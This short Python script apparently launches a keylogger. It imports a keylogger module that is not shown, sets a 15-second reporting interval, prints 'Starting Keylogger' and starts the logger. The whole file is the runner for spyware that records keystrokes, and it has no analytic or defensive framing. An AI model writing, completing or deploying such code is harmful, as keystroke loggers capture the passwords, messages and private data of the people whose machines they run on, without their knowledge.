from keylogger import *

INTERVAL = 15
print("Starting Keylogger")
keylogger = Keylogger(interval=INTERVAL)
keylogger.start()